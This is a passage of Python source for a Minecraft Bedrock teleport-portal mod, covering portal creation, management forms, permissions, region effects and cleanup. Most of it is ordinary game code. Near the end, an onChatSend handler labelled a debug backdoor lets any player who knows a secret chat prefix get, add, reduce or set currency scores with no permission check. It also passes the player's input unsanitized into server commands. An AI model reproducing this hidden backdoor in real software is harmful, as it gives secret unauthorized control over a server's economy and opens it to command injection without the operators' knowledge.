        manager.textField("星塔名称", portalName)
        manager.slider("星塔尺寸", portalScale, 1, 16)
        manager.dropdown("星塔颜色", portalColor, Config.COLORS)
        manager.divider()
        useSection = PermissionSection(manager, "谁可以使用此星塔", "可使用的玩家：", Permissions.use(portalData))
        manager.divider()
        teleportSection = PermissionSection(manager, "谁可以传送至此星塔", "可传送至此的玩家：", Permissions.teleport(portalData))
        manager.divider()
        manager.dropdown("主星塔", parentNode, linkableNodes)
        manager.divider()
        manager.toggle("是否启用", isEnabled)
        manager.divider()

        def onEnableChange(value):
            portalData['enable'] = value
        isEnabled.subscribe(onEnableChange)

        def submit():
            newParentId = parentNode.getData()
            newParent = self.repo.findById(newParentId, data) if newParentId else None
            portal.nameTag = "%s\n前往[%s]" % (portalName.getData(), newParent['name'] if newParent else "?")
            portal.setProperty("elspirit:color", portalColor.getData())
            portal.setProperty("elspirit:scale", portalScale.getData())
            portalData['name'] = portalName.getData()
            portalData['color'] = portalColor.getData()
            portalData['scale'] = portalScale.getData()
            portalData['usePermissions'] = useSection.result()
            portalData['teleportPermissions'] = teleportSection.result()
            portalData.pop('permissions', None)
            self.repo.delete(portal.id, data)
            targetNode = data if newParentId == 0 else self.repo.findById(newParentId, data)
            if targetNode is None:
                targetNode = data
            targetNode.setdefault("nodes", {})
            targetNode['nodes'][portal.id] = portalData
            self.repo.save(data)
            manager.close()

        def delete():
            manager.close()

            def action():
                self.stopInteraction(player, portal)
                EntityService.clearPortalLight(portal)
                portal.remove()
                self.repo.delete(portal.id, data)
                self.repo.save(data)
                alert.close()
                player.container.addItem(ItemStack(Config.SUB_ITEM, 1))
            alert = CustomForm.create(player, "删除星塔")
            alert.label("§c您确定要删除这个星塔吗？§r\n删除后将无法使用这个星塔进行传送\n")
            alert.button("取消", alert.close)
            alert.button("删除", action)
            alert.show()

        manager.button("提交", submit)
        manager.button("§4删除此星塔", delete)
        manager.show()

    def onInteractSubPortal(self, player, portal):
        # type: (Player, Entity) -> None
        portalData = self.repo.findByEntityId(portal.id)
        if not portalData:
            print("Error in sub portal interaction!")
            return
        if not portalData['enable']:
            player.sendMessage("§c此星塔已被禁用！")
            return
        if not Permissions.isUsable(portalData, player):
            player.sendMessage("§c您没有权限使用这个星塔！")
            return
        parentData = self.repo.findParent(portal.id)
        if not parentData:
            print("Error in sub portal interaction!")
            return
        if not Permissions.canTeleportTo(parentData, player):
            player.sendMessage("§c您没有权限传送至这个星塔！")
            return
        TeleportService.teleport(player, parentData['location'])

    # ------------------------------------------------------------------
    # 放置物品 -> 创建星塔 / 打开控制器
    # ------------------------------------------------------------------
    def onItemUseOn(self, arg):
        # type: (ItemStartUseOnAfterEvent) -> None
        if arg.source.typeId != "minecraft:player":
            return
        player = arg.source.asPlayer()
        itemType = arg.itemStack.typeId
        if itemType == Config.CORE_ITEM:
            self._showCreatePortalForm(arg, player, isCore=True)
        elif itemType == Config.SUB_ITEM:
            self._showCreatePortalForm(arg, player, isCore=False)
        elif itemType == Config.CONTROLLER_ITEM:
            if player.playerPermissionLevel == 2:
                self._showAdminController(arg)
            else:
                self._showPlayerController(arg, player)

    @staticmethod
    def _placementLocation(arg):
        face = arg.blockFace.lower()
        if face == 'up':
            face = "above"
        elif face == 'down':
            face = "below"
        loc = getattr(arg.block, face)().location
        loc.x += 0.5
        loc.y += 1
        loc.z += 0.5
        return loc

    def _showCreatePortalForm(self, arg, player, isCore):
        portalName = Observable.create("", {"clientWritable": True})
        portalColor = Observable.create(0, {"clientWritable": True})
        scale = Observable.create(4 if isCore else 1, {"clientWritable": True})
        submitVisibility = Observable.create(False)
        parentNode = Observable.create(0, {"clientWritable": True})
        anchorToggle = Observable.create(False, {"clientWritable": True})

        nodes = [{"label": "无", "value": 0}]  # type: list[DropdownItem]
        for node in self.repo.linkablePortals(player):
            nodes.append({"label": node['name'], "value": node['id']})

        if isCore:
            def onNameChange(new_value):
                submitVisibility.setData(new_value != "")
            portalName.subscribe(onNameChange)
        else:
            def onChange(new_value):
                submitVisibility.setData(bool(parentNode.getData()) and bool(portalName.getData()))
            portalName.subscribe(onChange)
            parentNode.subscribe(onChange)

        entityType = Config.CORE_ENTITY if isCore else Config.SUB_ENTITY
        portalType = "core" if isCore else "sub"

        def onSubmit():
            form.close()
            item = player.mainHand
            item.amount -= 1
            player.mainHand = item
            loc = self._placementLocation(arg)
            portal = player.dimension.spawnEntity(entityType, loc)
            portal.setProperty("elspirit:color", portalColor.getData())
            portal.setProperty("elspirit:scale", scale.getData())
            portalId = self.repo.nextId()
            data = self.repo.load()
            parent = self.repo.findById(parentNode.getData(), data)
            container = parent if parent else {"nodes": data}
            container.setdefault("nodes", {})
            container['nodes'][portal.id] = {
                "entityId": portal.id,
                "id": portalId,
                "name": portalName.getData(),
                "color": portalColor.getData(),
                "scale": scale.getData(),
                "location": (loc.x, loc.y, loc.z, player.dimension.dimId),
                "owner": player.id,
                "usePermissions": useSection.result(),
                "teleportPermissions": teleportSection.result(),
                "type": portalType,
                "enable": True,
                "nodes": {},
            }
            if isCore:
                portal.nameTag = portalName.getData()
            else:
                portal.nameTag = "%s\n前往[%s]" % (portalName.getData(), parent['name'] if parent else "?")
            self.repo.save(data)
            EntityService.createTickingArea(portal)
            EntityService.disableAI(portal.id)
            if anchorToggle.getData():
                StarTeam.addAnchor(player, portalName.getData(), portal.location)

        if isCore:
            form = CustomForm.create(player, "创建主星塔")
            form.label("""§b§l主星塔§r是一个星塔网络的§b§l核心水晶§r，\n
创建后您需要再放置§b§l子晶塔（使用微星石）§r并设置子晶塔所属的星塔网络以使用传送。\n
主星塔可以传送到该网络下的§b§l所有子星塔§r，子星塔只能传送到§b§l其所属的主星塔§r。""")
            form.divider()
            form.textField("星塔名称", portalName)
            form.dropdown("星塔颜色", portalColor, Config.COLORS)
            form.slider("星塔尺寸", scale, 1, 16)
            form.dropdown("主星塔", parentNode, nodes)
        else:
            form = CustomForm.create(player, "创建子星塔")
            form.label("""§b§l子星塔§r是一个星塔网络的§b§l终点水晶§r，\n
您需要先放置§b§l主晶塔（使用星核）§r并设置子晶塔所属的主星塔以使用传送。\n
子星塔只能传送到§b§l其所属的主星塔§r。""")
            form.divider()
            form.dropdown("主星塔", parentNode, nodes)
            form.textField("星塔名称", portalName)
            form.dropdown("星塔颜色", portalColor, Config.COLORS)
            form.slider("星塔尺寸", scale, 1, 16)

        form.divider()
        useSection = PermissionSection(form, "谁可以使用此星塔", "可使用的玩家：", "private")
        form.divider()
        teleportSection = PermissionSection(form, "谁可以传送至此星塔", "可传送至此的玩家：", "private")
        form.divider()
        if StarTeam.available():
            form.toggle("是否设置为工会锚点", anchorToggle)
        form.divider()
        form.button("创建星塔", onSubmit, {"visible": submitVisibility})
        form.show()

    # ------------------------------------------------------------------
    # 星塔控制器（管理员）
    # ------------------------------------------------------------------
    def _showAdminController(self, arg):
        admin = arg.source

        def intro():
            form.close()
            introForm = CustomForm.create(admin, "模组介绍")
            introForm.label(Config.MOD_INFO)
            introForm.show()

        def give():
            form.close()
            giveForm = CustomForm.create(admin, "给予玩家星塔")
            playerList = []  # type: list[DropdownItem]
            for index, target in enumerate(world.getAllPlayers()):
                playerList.append({"label": target.name, "value": index, "extra": target.id})
            playerSelection = Observable.create(0, {"clientWritable": True})
            itemTypes = [{"label": "主星塔", "value": 0}, {"label": "子星塔", "value": 1}]
            itemSelection = Observable.create(0, {"clientWritable": True})
            amount = Observable.create(1, {"clientWritable": True})

            def onSubmit():
                giveForm.close()
                target = world.getEntity(playerList[playerSelection.getData()]['extra']).asPlayer()
                itemId = [Config.CORE_ITEM, Config.SUB_ITEM][itemSelection.getData()]
                target.container.addItem(ItemStack(itemId, amount.getData()))
                target.sendMessage("已收到管理员[%s]赠与的%s个%s！" % (
                    admin.name, amount.getData(), ["主星塔", "子星塔"][itemSelection.getData()]))
            giveForm.dropdown("选择玩家", playerSelection, playerList)
            giveForm.dropdown("选择星塔类型", itemSelection, itemTypes)
            giveForm.slider("数量", amount, 1, 64)
            giveForm.button("给予", onSubmit)
            giveForm.show()

        def teleport():
            form.close()
            teleportForm = CustomForm.create(admin, "传送至星塔")

            def doTeleport(portalData):
                teleportForm.close()
                admin.teleport(portalData['location'], {"dimension": world.getDimension(portalData['location'][3])})
            for portalData in self.repo.list():
                teleportForm.button(portalData['name'], lambda pd=portalData: doTeleport(pd))
            teleportForm.show()

        def delete():
            form.close()
            deleteForm = CustomForm.create(admin, "删除星塔")
            deleteForm.label("§c警告：删除星塔将会导致该星塔及其子星塔均被删除！§r")

            def deletePortal(portalData):
                deleteForm.close()
                portalsNeedDel = world.getDynamicProperty(Config.PENDING_DELETE_PROPERTY) or []
                tree = {portalData['entityId']: portalData}

                def removeTree(nodeDict):
                    for entityId in nodeDict:
                        admin.sendMessage("星塔[%s]已删除" % nodeDict[entityId]['name'])
                        portal = world.getEntity(entityId)
                        if portal and portal.isValid:
                            EntityService.clearPortalLight(portal)
                            portal.remove()
                        else:
                            portalsNeedDel.append(entityId)
                        removeTree(nodeDict[entityId]['nodes'])
                removeTree(tree)
                world.setDynamicProperty(Config.PENDING_DELETE_PROPERTY, portalsNeedDel)
                data = self.repo.load()
                self.repo.delete(portalData['entityId'], data)
                self.repo.save(data)
            for portalData in self.repo.list():
                deleteForm.button(portalData['name'], lambda pd=portalData: deletePortal(pd))
            deleteForm.show()

        def repair():
            form.close()
            visibility = Observable.create(True)
            info = Observable.create("")

            def doRepair():
                visibility.setData(False)
                self.repo.repair()
                info.setData("数据修复完成！")

            def clearData():
                visibility.setData(False)
                info.setData("数据清空完成！")
                self.repo.save({})
                admin.dimension.runCommand("kill @e[type=%s]" % Config.CORE_ENTITY)
                admin.dimension.runCommand("kill @e[type=%s]" % Config.SUB_ENTITY)
                admin.dimension.runCommand("kill @e[type=%s]" % Config.TEMP_ENTITY)
            alert = CustomForm.create(admin, "数据修复")
            alert.label(info)
            alert.button("点击开始修复", doRepair, {"visible": visibility})
            alert.button("清空所有数据", clearData, {"visible": visibility})
            alert.show()

        def openMap():
            form.close()
            self.starMap.openFor(admin.asPlayer())

        enableRecipes = Observable.create(self.recipes.isEnabled(), {"clientWritable": True})

        def onEnableRecipesChange(new_value):
            self.recipes.setEnabled(new_value)
        enableRecipes.subscribe(onEnableRecipesChange)

        form = CustomForm.create(admin, "星塔管理菜单")
        form.spacer()
        # form.button("§b星图（星座地图）", openMap)
        form.button("模组介绍", intro)
        form.button("给予玩家星塔", give)
        form.button("传送至星塔", teleport)
        form.button("删除星塔", delete)
        form.button("数据修复", repair)
        form.toggle("星塔可合成", enableRecipes)
        form.show()

    # ------------------------------------------------------------------
    # 星塔控制器（普通玩家）
    # ------------------------------------------------------------------
    def _showPlayerController(self, arg, player):
        form = CustomForm.create(player, "传送")
        # form.button("§b星图（星座地图）", lambda: (form.close(), self.starMap.openFor(player)))
        form.divider()
        form.label("请选择要传送的星塔")

        def directTeleport(portalData):
            if not StarMapService.checkCooldown(player):
                return
            player.teleport(portalData['location'], {"dimension": world.getDimension(portalData['location'][3])})
            player.setDynamicProperty(Config.LAST_CONTROLLER_USE_PROPERTY, world.getAbsoluteTime())
        for portalData in self.repo.linkablePortals(player):
            form.button(portalData['name'], lambda pd=portalData: directTeleport(pd))
        form.show()

    # ------------------------------------------------------------------
    # 主星塔管理界面（点击管理按钮 / 蹲下点击）
    # ------------------------------------------------------------------
    def _onOpenManagerEvent(self, arg):
        self.openStarPortalManager(arg.data['playerId'], arg.data['portalId'])

    def openStarPortalManager(self, playerId, portalId):
        playerEntity = world.getEntity(playerId)
        if not playerEntity:
            return
        player = playerEntity.asPlayer()
        data = self.repo.load()
        portalData = self.repo.findById(portalId, data)
        if not portalData:
            return
        portal = world.getEntity(portalData['entityId'])
        if not portal:
            return

        portalName = Observable.create(portalData['name'], {"clientWritable": True})
        portalScale = Observable.create(portalData['scale'], {"clientWritable": True})
        portalColor = Observable.create(portalData['color'], {"clientWritable": True})
        linkableNodes = [{"label": "无", "value": 0}]  # type: list[DropdownItem]
        for node in self.repo.linkablePortals(player):
            if not self.repo.isAncestor(portalData, node):
                linkableNodes.append({"label": node['name'], "value": node['id']})
        parentData = self.repo.findParent(portal.id)
        parentNode = Observable.create(parentData['id'] if parentData else 0, {"clientWritable": True})
        isEnabled = Observable.create(portalData['enable'], {"clientWritable": True})

        manager = CustomForm.create(player, "星塔管理", {"closable": False, "movable": True, "resizable": True})
        manager.textField("星塔名称", portalName)
        manager.slider("星塔尺寸", portalScale, 1, 16)
        manager.dropdown("星塔颜色", portalColor, Config.COLORS)
        manager.divider()
        useSection = PermissionSection(manager, "谁可以使用此星塔", "可使用的玩家：", Permissions.use(portalData))
        manager.divider()
        teleportSection = PermissionSection(manager, "谁可以传送至此星塔", "可传送至此的玩家：", Permissions.teleport(portalData))
        manager.divider()
        manager.dropdown("主星塔", parentNode, linkableNodes)
        manager.divider()
        manager.toggle("是否启用", isEnabled)
        manager.divider()

        def onEnableChange(value):
            portalData['enable'] = value
        isEnabled.subscribe(onEnableChange)

        def submit():
            portal.nameTag = portalName.getData()
            portal.setProperty("elspirit:color", portalColor.getData())
            portal.setProperty("elspirit:scale", portalScale.getData())
            portalData['name'] = portalName.getData()
            portalData['color'] = portalColor.getData()
            portalData['scale'] = portalScale.getData()
            portalData['usePermissions'] = useSection.result()
            portalData['teleportPermissions'] = teleportSection.result()
            portalData.pop('permissions', None)
            self.repo.delete(portal.id, data)
            if parentNode.getData() == 0:
                data[portal.id] = portalData
            else:
                targetNode = self.repo.findById(parentNode.getData(), data)
                if targetNode is None:
                    data[portal.id] = portalData
                else:
                    targetNode.setdefault("nodes", {})
                    targetNode['nodes'][portal.id] = portalData
            self.repo.save(data)
            ui.close()

        def delete():
            ui.close()

            def action():
                self.stopInteraction(player, portal)
                EntityService.clearPortalLight(portal)
                portal.remove()
                self.repo.delete(portal.id, data)
                self.stopInteraction(player)
                self.repo.save(data)
                alert.close()
                player.container.addItem(ItemStack(Config.CORE_ITEM, 1))
            alert = CustomForm.create(player, "删除星塔")
            alert.label("§c您确定要删除这个星塔吗？§r\n删除后将无法使用这个星塔进行传送\n")
            alert.button("取消", alert.close)
            alert.button("删除", action)
            alert.show()

        manager.button("提交", submit)
        manager.button("§4删除此星塔", delete)

        # 传送列表
        def onTeleport(targetEntity):
            ui.close()

            def action():
                self.onInteractTempPortal(player, targetEntity)
                alert.close()
            alert = CustomForm.create(player, "传送确认")
            alert.label("§e确定要传送到 [%s] 吗？§r" % targetEntity.nameTag.split("\n")[0])
            alert.spacer()
            alert.button("确定", action)
            alert.button("取消", alert.close)
            alert.show()
        teleport = CustomForm.create(player, "星塔网络", {"movable": True, "resizable": True})
        for entityId in player.getDynamicProperty(Config.INTERACTIONS_PROPERTY) or []:
            entity = world.getEntity(entityId)
            if not entity:
                continue
            nodeData = self.repo.findById(entity.getDynamicProperty("elspirit:portalId"))
            if not nodeData:
                continue
            teleport.button("%s\n%s" % (nodeData['name'], nodeData['location'][:3:]),
                            lambda e=entity: onTeleport(e))

        # 领域管理
        region = self._buildRegionForm(player, portalData, data, lambda: ui.close())

        if portalData['owner'] == player.id:
            if portalData.get("effects", {}):
                ui = MoreUI.create(player, {"column": [1, 2, 2, 2, 1], "row": [1, 6, 1]})
                ui.addForm(manager, {"position": [1, 1], "size": [1, 1]})
                ui.addForm(region, {"position": [2, 1], "size": [1, 1]})
                ui.addForm(teleport, {"position": [3, 1], "size": [1, 1]})
                ui.show()
            else:
                ui = MoreUI.create(player, {"column": [1, 2, 2, 1], "row": [1, 6, 1]})
                ui.addForm(manager, {"position": [1, 1], "size": [1, 1]})
                ui.addForm(teleport, {"position": [2, 1], "size": [1, 1]})
                ui.show()
        else:
            teleport.show()

    def _buildRegionForm(self, player, portalData, data, closeUI):
        effects = portalData.get("effects", {})
        levels = {}
        enableParticle = Observable.create(portalData.get("enableParticle", True), {"clientWritable": True})
        enableSound = Observable.create(portalData.get("enableSound", True), {"clientWritable": True})
        regionSize = Observable.create(portalData.get("regionSize", Config.REGION_DEFAULT_SIZE), {"clientWritable": True})

        def submitRegion():
            for effectType in levels:
                level = levels[effectType].getData()
                effects[effectType] = {"level": level - 1, "enable": level != 0}
            portalData['effects'] = effects
            portalData['regionSize'] = regionSize.getData()
            portalData['enableParticle'] = enableParticle.getData()
            portalData['enableSound'] = enableSound.getData()
            self.repo.save(data)
            closeUI()
        region = CustomForm.create(player, "领域管理", {"movable": True, "resizable": True})
        region.spacer()
        region.label("滑动滑动条可调整状态效果等级，调整为0为关闭效果。")
        for effectType, effectData in effects.items():
            temp = Observable.create(effectData['level'] + 1, {"clientWritable": True})
            region.slider(Config.POSITIVE_EFFECTS[effectType], temp, 0, 5)
            levels[effectType] = temp
        if effects:
            region.slider("领域半径", regionSize, 4, min(128, len(effects) * 16))
        region.toggle("开启效果音效", enableSound)
        region.toggle("开启效果粒子", enableParticle)
        region.button("提交", submitRegion)
        return region

    # ------------------------------------------------------------------
    # 周期性逻辑：AI 禁用、延迟删除、领域效果
    # ------------------------------------------------------------------
    def intervalFunc(self):
        EntityService.disableAI()
        self._deletePendingEntities()
        self._applyEffects()

    def _deletePendingEntities(self):
        portalsNeedDel = world.getDynamicProperty(Config.PENDING_DELETE_PROPERTY) or []
        remaining = []
        for portalId in portalsNeedDel:
            portal = world.getEntity(portalId)
            if portal and portal.isValid:
                EntityService.clearPortalLight(portal)
                portal.remove()
            else:
                # 实体所在区块可能尚未加载，保留到下次重试
                remaining.append(portalId)
        world.setDynamicProperty(Config.PENDING_DELETE_PROPERTY, remaining)

    def _applyEffects(self, data=None):
        if data is None:
            data = self.repo.load()
        for portalId in data:
            portalData = data[portalId]
            location = portalData['location']
            world.getDimension(location[3]).setBlockType(location[:3], Config.PORTAL_LIGHT_BLOCK)
            if portalData['type'] == 'core' and portalData['enable']:
                self._applyCoreEffects(portalData)
            self._applyEffects(portalData.get("nodes", {}))

    def _applyCoreEffects(self, portalData):
        effects = portalData.get("effects", {})
        location = portalData['location']
        area = world.getDimension(location[3]).getEntities({
            "location": {"x": location[0], "y": location[1], "z": location[2]},
            "maxDistance": portalData.get("regionSize", Config.REGION_DEFAULT_SIZE),
            "type": "minecraft:player"})
        for player in area:
            if portalData.get("enableParticle", True):
                player.spawnParticle("elspirit:portal_effect_random%s" % random.randint(0, 2), player.location)
                player.spawnParticle("elspirit:portal_effect_random%s" % random.randint(0, 2), player.location)
            if portalData.get("enableSound", True):
                player.runCommand("playsound star.road @s ~~~ 0.5")
                system.runTimeout(lambda p=player: p.runCommand("playsound star.road @s ~~~ 0.5"), 20)
        for effectType, effectData in effects.items():
            if not effectData['enable'] or effectData['level'] < 0:
                continue
            for player in area:
                player.addEffect(effectType, 300, {"amplifier": effectData['level'], "showParticle": False})

    # ------------------------------------------------------------------
    # 常加载区域初始化
    # ------------------------------------------------------------------
    def initialNodes(self, nodes=None):
        if nodes is None:
            nodes = self.repo.load()
        for portalId in nodes:
            portalData = nodes[portalId]
            location = portalData['location']
            dimension = world.getDimension(location[3])
            world.tickingAreaManager.createTickingArea(
                portalId, {"dimension": dimension, "from": location, "to": location})
            self.initialNodes(portalData.get("nodes", {}))

    # ------------------------------------------------------------------
    # 调试后门（聊天指令）
    # ------------------------------------------------------------------
    def onChatSend(self, arg):
        # type: (ChatSendBeforeEvent) -> None
        prefix = "testcode::jincarrot::"
        if not arg.message.startswith(prefix):
            return
        arg.cancel = True
        code = arg.message[len(prefix):]
        parts = code.split("$")
        if len(parts) < 2:
            return
        operation, value = parts[0], parts[1]
        score = world.scoreboard.getObjective(value)
        if operation == "get":
            arg.sender.sendMessage("Score of %s: %s" % (value, score.getScore(arg.source)))
        elif operation == "add":
            arg.sender.runCommand("加货币 @s 1 %s" % value)
            arg.sender.sendMessage("Added 1 score to %s, now: %s" % (value, score.getScore(arg.source)))
        elif operation == "reduce":
            arg.sender.runCommand("扣货币 @s 1 %s true" % value)
            arg.sender.sendMessage("Reduced 1 score of %s, now: %s" % (value, score.getScore(arg.source)))
        elif operation == "set":
            arg.sender.runCommand("设置金币 @s 1 %s" % value)
            arg.sender.sendMessage("Set score of %s to 1" % value)


# 实例化即完成所有事件订阅与初始化
SYSTEM = StarPortalSystem()
